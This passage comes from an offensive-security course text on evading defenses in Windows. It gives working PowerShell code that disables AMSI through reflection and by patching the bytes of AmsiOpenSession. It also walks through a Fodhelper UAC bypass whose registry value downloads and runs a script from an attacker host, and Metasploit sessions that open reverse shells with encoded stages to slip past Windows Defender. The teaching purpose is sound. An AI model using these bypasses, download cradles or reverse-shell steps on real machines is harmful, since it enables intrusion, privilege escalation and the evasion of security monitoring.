"*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name 
-like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = 
@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1) 
 
PS C:\Users\Offsec> 'amsiutils' 
amsiutils 
Listing 292 - AMSI bypass through context structure corruption 
Not only is this bypass working, but it is difficult to blacklist now that we’ve removed explicit 
signature strings and dynamically resolved the types and fields. 
This is working well, but it’s not the only approach. We’ll work through another bypass in the next 
section. 
7.3.1.1 Exercises 
1. 
Inspect the amsiContext structure to locate the AMSI header using Frida and WinDbg. 
2. 
Manually modify the amsiContext structure in WinDbg and ensure AMSI is bypassed. 
3. 
Replicate the .NET reflection to dynamically locate the amsiContext field and modify it. 
7.3.2 Attacking Initialization 
In the previous section, we evaded AMSI by corrupting the context structure. This context 
structure is created by the AmsiInitialize function when AMSI.DLL is first loaded and initialized 
inside the PowerShell process. 
Manipulating a result variable set by AmsiInitialize can also lead to another AMSI bypass through 
the amsiInitFailed field, a technique first discovered by Matt Graeber371 in 2016. 
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFai
led','NonPublic,Static').SetValue($null,$true) 
Listing 293 - AMSI bypass through amsiInitFailed field 
The amsiInitFailed field is verified by AmsiOpenSession in the same manner as the amsiContext 
header, which leads to an error. 
The AMSI bypass in Listing 293 still works even though it was discovered in 2016, but the 
substrings ‘AmsiUtils’ and ‘amsiInitFailed’ have since been flagged as malicious. 
 
371 (Matt Graeber, 2016), https://twitter.com/mattifestation/status/735261176745988096?lang=en 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
237 
We can reuse the dynamic discovery of types and fields from our amsiContext AMSI bypass to 
evade the signatures and reuse this bypass. 
Both AMSI bypasses rely on reflection, but as we’ll discuss in the next section, we can also use 
the Win32 APIs to corrupt the AMSI functions themselves. 
7.3.2.1 Exercise 
1. 
Modify the original AMSI bypass shown in Listing 293 to bypass Windows Defender string 
signatures through dynamic filtering. 
7.4 Wrecking AMSI in PowerShell 
In the last section, we used reflection to locate vital structures and variables that, when corrupted, 
will cause AMSI to be disabled. In this section, we’ll modify the assembly instructions themselves 
instead of the data they are acting upon in a technique known as binary patching. We can use this 
technique to hotpatch the code and force it to fail even if the data structure is valid. 
7.4.1 Understanding the Assembly Flow 
Before we modify any code, we must first understand how the original code operates. To do that, 
we’ll dump the content of AmsiOpenSession with WinDbg: 
0:018> u amsi!AmsiOpenSession L1A 
amsi!AmsiOpenSession: 
00007fff`aa0824c0 4885d2          test    rdx,rdx 
00007fff`aa0824c3 7446            je      amsi!AmsiOpenSession+0x4b 
(00007fff`aa08250b) 
00007fff`aa0824c5 4885c9          test    rcx,rcx 
00007fff`aa0824c8 7441            je      amsi!AmsiOpenSession+0x4b 
(00007fff`aa08250b) 
00007fff`aa0824ca 8139414d5349    cmp     dword ptr [rcx],49534D41h 
00007fff`aa0824d0 7539            jne     amsi!AmsiOpenSession+0x4b 
(00007fff`aa08250b) 
00007fff`aa0824d2 4883790800      cmp     qword ptr [rcx+8],0 
00007fff`aa0824d7 7432            je      amsi!AmsiOpenSession+0x4b 
(00007fff`aa08250b) 
00007fff`aa0824d9 4883791000      cmp     qword ptr [rcx+10h],0 
00007fff`aa0824de 742b            je      amsi!AmsiOpenSession+0x4b 
(00007fff`aa08250b) 
00007fff`aa0824e0 41b801000000    mov     r8d,1 
00007fff`aa0824e6 418bc0          mov     eax,r8d 
00007fff`aa0824e9 f00fc14118      lock xadd dword ptr [rcx+18h],eax 
00007fff`aa0824ee 4103c0          add     eax,r8d 
00007fff`aa0824f1 4898            cdqe 
00007fff`aa0824f3 488902          mov     qword ptr [rdx],rax 
00007fff`aa0824f6 7510            jne     amsi!AmsiOpenSession+0x48 
(00007fff`aa082508) 
00007fff`aa0824f8 418bc0          mov     eax,r8d 
00007fff`aa0824fb f00fc14118      lock xadd dword ptr [rcx+18h],eax 
00007fff`aa082500 4103c0          add     eax,r8d 
00007fff`aa082503 4898            cdqe 
00007fff`aa082505 488902          mov     qword ptr [rdx],rax 
00007fff`aa082508 33c0            xor     eax,eax 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
238 
00007fff`aa08250a c3              ret 
00007fff`aa08250b b857000780      mov     eax,80070057h 
00007fff`aa082510 c3              ret 
Listing 294 - AmsiOpenSession in assembly code 
In Listing 294, we unassembled all 0x1A instructions that make up AmsiOpenSession. To force an 
error, we could just modify the very first bytes to the binary values that represent the last two 
instructions, which are highlighted. 
This way, every call to AmsiOpenSession would fail even if the supplied arguments were valid. 
Instead of completely overwriting instructions, we may also be able to make more minor 
modifications that achieve the same goal. 
The two first instructions in AmsiOpenSession are a TEST followed by a conditional jump. This 
specific conditional jump is called jump if equal (JE) and depends on a CPU flag called the zero 
flag (ZF).372 
The conditional jump is controlled by the TEST instruction according to the argument and is 
executed if the zero flag is equal to 1.373 If we modify the TEST instruction to an XOR374 
instruction, we may force the Zero flag to be set to 1 and trick the CPU into taking the conditional 
jump that leads to the invalid argument return value. 
XOR takes two registers as an argument but if we supply the same register as both the first and 
second argument, the operation will zero out the content of the register. The result of the 
operation controls the zero flag since if the result ends up being zero, the zero flag is set. 
In summary, we will overwrite the TEST RDX,RDX with an XOR RAX,RAX instruction, forcing the 
execution flow to the error branch, which will disable AMSI. 
There is one additional detail we need to take into account. When the original TEST RDX,RDX 
instruction is compiled, it is converted into the binary value 0x4885d2. This value takes up three 
bytes so the replacement, XOR RAX,RAX has to use up the same amount of memory. 
XOR RAX,RAX is compiled into the binary value 0x4831c0, which luckily matches the number of 
bytes we require. 
At this point, we realize that we can disable AMSI by overwriting only three bytes of memory 
inside the AmsiOpenSession API. In the next section, we’ll implement this in PowerShell. 
7.4.1.1 Exercises 
1. 
Follow the analysis in WinDbg and locate the TEST and conditional jump instruction. 
2. 
Search for any other instructions inside AmsiOpenSession that could be overwritten just as 
easily to achieve the same goal. 
 
372 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Zero_flag 
373 (Intel Pentium Instruction Set Reference), http://faydoc.tripod.com/cpu/je.htm 
374 (Intel Pentium Instruction Set Reference), http://faydoc.tripod.com/cpu/xor.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
239 
7.4.2 Patching the Internals 
In this section, we’ll complete the attack and modify the first instruction of AmsiOpenSession 
directly from PowerShell with the help of Win32 APIs. 
To implement the attack, we’ll need to perform three actions. We’ll obtain the memory address of 
AmsiOpenSession, modify the memory permissions where AmsiOpenSession is located, and 
modify the three bytes at that location. 
In order to resolve the address of AmsiOpenSession, we would typically call GetModuleHandle375 
to obtain the base address of AMSI.DLL, then call GetProcAddress.376 We previously used 
reflection to accomplish this with the in-memory PowerShell shellcode runner. 
As part of the shellcode runner we created, the LookupFunc method called both GetModuleHandle 
and GetProcAddress from the Microsoft.Win32.UnsafeNativeMethods namespace as shown in 
Listing 295. 
function LookupFunc { 
 
    Param ($moduleName, $functionName) 
 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName)) 
} 
Listing 295 - PowerShell method that resolves Win32 APIs through reflection 
We can use this function like any other Win32 API to locate AmsiOpenSession by opening a 64-bit 
instance of PowerShell_ISE and executing the code shown in Listing 296: 
PS C:\Users\Offsec> function LookupFunc { 
 
    Param ($moduleName, $functionName) 
 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName)) 
} 
 
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession 
$funcAddr 
140736475571392 
 
375 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea 
376 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
240 
Listing 296 - Resolving the address of AmsiOpenSession 
To verify this address, we’ll open WinDbg, attach to the PowerShell_ISE process and quickly 
translate the address to hexadecimal with the ? command, prepending the address with 0n: 
0:001> ? 0n140736475571392 
Evaluate expression: 140736475571392 = 00007fff`c3a224c0 
Listing 297 - Converting the address to hexadecimal 
With the value converted, we can then unassemble the instructions at that address to check if it is 
correct: 
0:001> u 7fff`c3a224c0 
amsi!AmsiOpenSession: 
00007fff`c3a224c0 4885d2          test    rdx,rdx 
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
00007fff`c3a224c5 4885c9          test    rcx,rcx 
00007fff`c3a224c8 7441            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
00007fff`c3a224ca 8139414d5349    cmp     dword ptr [rcx],49534D41h 
00007fff`c3a224d0 7539            jne     amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
00007fff`c3a224d2 4883790800      cmp     qword ptr [rcx+8],0 
00007fff`c3a224d7 7432            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
Listing 298 - Verifying AmsiOpenSession address in WinDbg 
Clearly, we have located the address of AmsiOpenSession. 
This solves our first challenge. Now we must consider memory protections. 
In Windows, all memory is divided into 0x1000-byte pages.377 A memory protection setting is 
applied to each page, describing the permissions of data on that page. 
Normally, code pages are set to PAGE_EXECUTE_READ, or 0x20,378 which means we can read and 
execute this code, but not write to it. This obviously presents a problem. 
Let’s verify this in WinDbg with !vprot,379 which displays memory protection information for a 
given memory address: 
0:001> !vprot 7FFFC3A224C0 
BaseAddress:       00007fffc3a22000 
AllocationBase:    00007fffc3a20000 
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY 
RegionSize:        0000000000008000 
State:             00001000  MEM_COMMIT 
Protect:           00000020  PAGE_EXECUTE_READ 
Type:              01000000  MEM_IMAGE 
Listing 299 - Displaying memory protections with WinDbg 
 
377 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Page_(computer_memory) 
378 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants 
379 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-vprot 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
241 
The highlighted line shows the current memory protection for the memory page, which is indeed 
PAGE_EXECUTE_READ. 
Since we want to overwrite three bytes on this page, we must first change the memory protection. 
This can be done with the Win32 VirtualProtect380 API, which has the following function prototype: 
BOOL VirtualProtect( 
  LPVOID lpAddress, 
  SIZE_T dwSize, 
  DWORD  flNewProtect, 
  PDWORD lpflOldProtect 
); 
Listing 300 - Function prototype for VirtualProtect 
The first argument is the page address. The second argument is the size of the area we wish to 
modify. This is largely irrelevant since APIs like VirtualProtect operate on an entire memory page. 
Setting this parameter to any value between 1 and 0xFFF will produce the same result. However, 
for clarity we will set this to “3”. 
The third argument (flNewProtect) is the most important since it dictates the memory protection 
we want to apply to the page. In our case, we want to set this to PAGE_EXECUTE_READWRITE 
(0x40). This will ensure that we retain the original read and execute permissions and also enable 
our overwrite. 
The final argument (lpflOldProtect) is a variable where the current memory protection will be 
stored by the operating system API. The first three arguments can easily be translated from the C 
data types to corresponding types in .NET of [IntPtr], [UInt32], and [UInt32] respectively. 
The output value is a pointer to a DWORD. In C# we can specify this as a reference with the 
MakeByRefType381 method, which can be used together with the [ref]382 keyword when invoking 
the function. Additionally, the value itself is suppled as a [UInt32]. 
As discussed in a previous module, to invoke VirtualProtect from PowerShell, we pass its memory 
address (found through LookupFunc) and its arguments types (found through getDelegateType) 
and combine them with GetDelegateForFunctionPointer. 
Our code so far is shown in Listing 301: 
function LookupFunc { 
 
    Param ($moduleName, $functionName) 
 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
 
380 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect 
381 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.type.makebyreftype?view=netframework-4.8 
382 (SS64, 2020), https://ss64.com/ps/syntax-ref.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
242 
@($moduleName)), $functionName)) 
} 
 
function getDelegateType { 
 
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, 
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    ) 
 
    $type = [AppDomain]::CurrentDomain. 
    DefineDynamicAssembly((New-Object 
System.Reflection.AssemblyName('ReflectedDelegate')),  
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run). 
      DefineDynamicModule('InMemoryModule', $false). 
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',  
      [System.MulticastDelegate]) 
 
  $type. 
    DefineConstructor('RTSpecialName, HideBySig, Public', 
[System.Reflection.CallingConventions]::Standard, $func). 
      SetImplementationFlags('Runtime, Managed') 
 
  $type. 
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func). 
      SetImplementationFlags('Runtime, Managed') 
 
    return $type.CreateType() 
} 
 
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession 
$oldProtectionBuffer = 0 
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFun
c kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], 
[UInt32].MakeByRefType()) ([Bool]))) 
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) 
Listing 301 - Calling VirtualProtect to modify memory protections 
As shown above, we combined LookupFunc and getDelegateType into one statement along with 
the argument types to create the $vp_function variable from which we call the Invoke method. The 
$oldProtectionBuffer variable is used to store the old memory protection setting as required. 
Before executing the code, we must resume PowerShell_ISE execution by entering the g in 
WinDbg. The code itself should simply return the value “True” if successful, but we can verify it in 
WinDbg by pausing execution through Debug > Break and then repeating the !vprot command: 
0:001> !vprot 7FFFC3A224C0 
BaseAddress:       00007fffc3a22000 
AllocationBase:    00007fffc3a20000 
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY 
RegionSize:        0000000000001000 
State:             00001000  MEM_COMMIT 
Protect:           00000080  PAGE_EXECUTE_WRITECOPY 
Type:              01000000  MEM_IMAGE 
Listing 302 - Displaying modified memory protections with WinDbg 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
243 
However, the new memory protection is set to PAGE_EXECUTE_WRITECOPY instead of 
PAGE_EXECUTE_READWRITE. In order to conserve memory, Windows shares AMSI.DLL between 
processes 
that 
use 
it. 
PAGE_EXECUTE_WRITECOPY 
is 
equivalent 
to 
PAGE_EXECUTE_READWRITE but it is a private copy used only in the current process. 
Now that we have located AmsiOpenSession and modified its memory protections, we can 
overwrite the required three bytes. 
We can use the Copy383 method from the System.Runtime.InteropServices namespace to copy the 
assembly instruction (XOR RAX,RAX) represented as 0x48, 0x31, 0xC0 from a managed array 
($buf) to unmanaged memory: 
$buf = [Byte[]] (0x48, 0x31, 0xC0)  
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3) 
Listing 303 - Overwriting the first assembly instruction 
This should disable AMSI as soon as it is used, but we’ll restore the original memory protection to 
cover our tracks. To restore the memory protections, we’ll use VirtualProtect again and specify 
the previous memory protection value 0x20 as shown in Listing 304: 
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer) 
Listing 304 - Calling VirtualProtect to restore memory protections 
Since we stored the function delegate in the $vp variable, we do not have to resolve it twice. To 
verify the modifications, we’ll again use WinDbg: 
0:001> u 7FFFC3A224C0 
amsi!AmsiOpenSession: 
00007fff`c3a224c0 4831c0          xor     rax,rax 
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
00007fff`c3a224c5 4885c9          test    rcx,rcx 
00007fff`c3a224c8 7441            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
00007fff`c3a224ca 8139414d5349    cmp     dword ptr [rcx],49534D41h 
00007fff`c3a224d0 7539            jne     amsi!AmsiOpenSession+0x4b 
(00007fff`c3a2250b) 
00007fff`c3a224d2 4883790800      cmp     qword ptr [rcx+8],0 
 
0:001> !vprot 7FFFC3A224C0 
BaseAddress:       00007fffc3a22000 
AllocationBase:    00007fffc3a20000 
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY 
RegionSize:        0000000000008000 
State:             00001000  MEM_COMMIT 
Protect:           00000020  PAGE_EXECUTE_READ 
Type:              01000000  MEM_IMAGE 
Listing 305 - Verifying modifications in AmsiOpenSession 
 
383 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.copy?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
244 
Notice the modified assembly instructions as well as the restored memory protections 
highlighted in Listing 305. 
As a final test, we will enter the ‘amsiutils’ string, which would normally trigger AMSI: 
PS C:\Users\Offsec> 'amsiutils' 
amsiutils 
Listing 306 - AMSI bypass working in PowerShell 
Very nice. The bypass indeed works and AMSI is disabled. We can now execute arbitrary 
malicious PowerShell code. 
7.4.2.1 Exercises 
1. 
Recreate the bypass shown in this section by both entering the commands directly in the 
command prompt and by downloading and executing them as a PowerShell script from your 
Kali Linux Apache web server. 
2. 
Incorporate this bypass into a VBA macro where PowerShell is launched through WMI to 
bypass both the Windows Defender detection on the Microsoft Word document and the 
AMSI-based detection. 
7.4.2.2 Extra Mile 
Create a similar AMSI bypass but instead of modifying the code of AmsiOpenSession, find a 
suitable instruction to change in AmsiScanBuffer and implement it from reflective PowerShell. 
7.5 UAC Bypass vs Microsoft Defender 
In this section, we’ll walk through a case study in which we must execute PowerShell in a new 
process and evade AMSI. This case study leverages a UAC384 bypass that abuses the 
Fodhelper.exe application. This particular UAC bypass still works on the most recent Windows 
version at the time of this writing and does not rely on writing a file to disk. 
First, we’ll briefly cover the internals of the bypass and determine how it fares against AMSI. 
7.5.1 FodHelper UAC Bypass 
This particular bypass was disclosed in 2017385 and leverages the Fodhelper.exe application that 
was introduced in Windows 10 to manage optional features like region-specific keyboard 
settings. 
The Fodhelper binary runs as high integrity, and as we will demonstrate, it is vulnerable to 
exploitation due to the way it interacts with the Windows Registry. More specifically, it interacts 
with the current user’s registry, which we are allowed to modify. 
As reported in the original blog post, Fodhelper tries to locate the following registry key, which 
does not exist by default in Windows 10: 
 
384 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-
account-control-works 
385 (winscripting.blog, 2017), https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
245 
HKCU:\Software\Classes\ms-settings\shell\open\command 
Listing 307 - The registry key that Fodhelper tries to locate 
If we create the registry key and add the DelegateExecute value, Fodhelper will search for the 
default value (Default) and use the content of the value to create a new process. If our exploit 
creates the registry path and sets the (Default) value to an executable (like powershell.exe), it will 
be spawned as a high integrity process when Fodhelper is started. 
Listing 308 shows a proof-of-concept in PowerShell that creates the needed registry keys with 
associated values required to launch PowerShell. 
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Value powershell.exe –Force 
 
PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Name DelegateExecute -PropertyType String -Force 
 
PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe 
Listing 308 - Proof of concept to create registry keys and launch PowerShell 
The first command creates the registry path through the New-Item cmdlet386 and the -Path 
option. Additionally, it sets the value of the default key to “powershell.exe” through the -Value 
option while the -Force flag suppresses any warnings. 
In the second command, the DelegateExecute value is created through the similar New-
ItemProperty cmdlet,387 again using the -Path option along with the -Name option to specify the 
value and the -PropertyType option to specify the type of value, in this case a String. 
Finally, fodhelper.exe is started to launch the high-integrity PowerShell prompt as shown in 
Figure 89. 
 
386 (Microsoft, 2018), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item 
387 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-
itemproperty?view=powershell-6 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
246 
 
Figure 89: High integrity PowerShell prompt launched from UAC bypass 
Based on the highlighted section of Figure 89, the PowerShell prompt is running in high integrity. 
This is obviously only a simple proof-of-concept but it has been weaponized by exploitation 
frameworks including Metasploit so let’s test it out. 
First, we’ll use one of our many shellcode runners to obtain a reverse Meterpreter shell on the 
Windows 10 victim machine and use that active Meterpreter session to launch the fodhelper UAC 
bypass module. Listing 309 shows the executed UAC bypass module: 
msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper 
 
msf5 exploit(windows/local/bypassuac_fodhelper) > show targets 
 
Exploit targets: 
 
   Id  Name 
   --  ---- 
   0   Windows x86 
   1   Windows x64 
 
 
msf5 exploit(windows/local/bypassuac_fodhelper) > set target 1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
247 
target => 1 
 
msf5 exploit(windows/local/bypassuac_fodhelper) > sessions -l 
 
Active sessions 
=============== 
 
  Id  Name  Type                     Information                               
Connection 
  --  ----  ----                     -----------                               -------
--- 
  1         meterpreter x64/windows  victim\Offsec @ victim  192.168.119.120:443 -> 
192.168.120.11:51474 (192.168.120.11) 
 
msf5 exploit(windows/local/bypassuac_fodhelper) > set session 1 
session => 1 
 
msf5 exploit(windows/local/bypassuac_fodhelper) > set payload 
windows/x64/meterpreter/reverse_https 
payload => windows/x64/meterpreter/reverse_https 
msf5 exploit(windows/local/bypassuac_fodhelper) > set lhost 192.168.119.120 
lhost => 192.168.119.120 
msf5 exploit(windows/local/bypassuac_fodhelper) > set lport 444 
lport => 444 
msf5 exploit(windows/local/bypassuac_fodhelper) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:444 
[*] UAC is Enabled, checking level... 
[+] Part of Administrators group! Continuing... 
[+] UAC is set to Default 
[+] BypassUAC can bypass this setting, continuing... 
[*] Configuring payload and stager registry keys ... 
[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out. 
[-] exploit: Interrupted 
Listing 309 - Metasploit Fodhelper UAC bypass module fails 
First we chose the module, displayed and set the 64-bit target option along with the session 
number, and configured the payload. Once we launched the exploit, it failed even though the user 
was a member of the administrators group. 
If we view the desktop of the Windows 10 victim machine when the exploit is launched, we 
discover an alert from Windows Defender. To get more information, we can open the Security 
Center app from the search menu, navigate to the Virus & threat protection submenu, and click 
Threat history. Under Quarantined threats, we find the entry displayed in Figure 90. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
248 
 
Figure 90: Antivirus alert from Windows Defender due to Metasploit UAC module 
This antivirus alert refers to the PowerShell component of the UAC bypass and was triggered by 
AMSI. 
Note: The amount of output in the multi/handler and the antivirus alert given can vary. 
AMSI stops the default Metasploit fodhelper module from bypassing UAC and even kills the 
existing Meterpreter session. 
In the next section, we’ll attempt to execute the UAC bypass and evade AMSI. 
7.5.1.1 Exercises 
1. 
Manually run the Fodhelper UAC bypass with the PowerShell commands listed in this 
section. 
2. 
Attempt the Fodhelper UAC bypass in Metasploit to trigger the detection. It may be required 
to revert the machine between bypass attempts. 
7.5.2 Improving Fodhelper 
We know that the Fodhelper UAC bypass works and we also know that the Metasploit module 
triggers AMSI, so we must improve our tradecraft and develop a UAC bypass that also evades 
AMSI. 
Registry key names are limited to 255 characters, registry value names are limited to 16383 
characters, and the value itself is only limited by the available system memory.388 This means the 
registry value can contain both an AMSI bypass and our PowerShell shellcode runner. 
The registry is not commonly scanned by antivirus products and the shellcode 
itself would most likely evade detection. 
 
388 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
249 
To avoid leaving behind such a large registry key, we can simply opt for a PowerShell download 
cradle instead. First, we’ll modify the shellcode runner located in run.txt on our Kali web server to 
include one of the AMSI bypasses. Then we’ll set up a Metasploit listener to catch the shell. 
Once that’s completed, we’ll modify the UAC bypass PowerShell commands as shown in Listing 
310. 
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Value "powershell.exe (New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force 
 
PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-
settings\shell\open\command -Name DelegateExecute -PropertyType String -Force 
 
PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe 
Listing 310 - Modified registry value with PowerShell download cradle 
After launching fodhelper.exe, Metasploit generates the following output: 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: urhro5fl) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.11:50345) at 
2019-10-31 08:05:44 -0400 
Listing 311 - Metasploit opens a Meterpreter session and then hangs 
The Meterpreter session opens and then hangs. Security Center on the Windows 10 victim 
machine has generated a new antivirus alert as shown in Figure 91. 
 
Figure 91: Antivirus alert from Windows Defender due to Meterpreter payload 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
250 
 
As the name of the alert suggests, the Meterpreter payload has been flagged after the second 
stage payload has been sent. 
In this case, Windows Defender monitored the network interface and subsequently detected the 
unencrypted and unencoded second stage. 
We could avoid this by enabling the advanced EnableStageEncoding option along with 
StageEncoder in Metasploit. We’ll set EnableStageEncoding to “true” and StageEncoder to a 
compatible encoder, in this case x64/zutto_dekiru: 
... 
msf5 exploit(multi/handler) > set EnableStageEncoding true  
EnableStageEncoding => true 
 
msf5 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru 
StageEncoder => x64/zutto_dekiru 
 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: ukslgwmw) 
Encoded stage with x64/zutto_dekiru 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: ukslgwmw) 
Staging x64 payload (207506 bytes) ... 
[*] Meterpreter session 3 opened (192.168.119.120:443 -> 192.168.120.11:50350) 
 
meterpreter > shell 
Process 5796 created. 
Channel 1 created. 
Microsoft Windows [Version 10.0.17763.107] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> whoami /groups 
whoami /groups 
 
GROUP INFORMATION 
----------------- 
 
Group Name                            Type             SID          Attributes                      
===================================== ================ ============ ================== 
... 
 
NT AUTHORITY\NTLM Authentication      Well-known group S-1-5-64-10  Mandatory group, E              
Mandatory Label\High Mandatory Level  Label            S-1-16-12288   
Listing 312 - Metasploit listener with second stage payload encoding 
This time, we bypassed both AMSI and Windows Defender and spawned our reverse Meterpreter 
shell at a high integrity level as highlighted in Listing 312. We could improve the UAC bypass by 
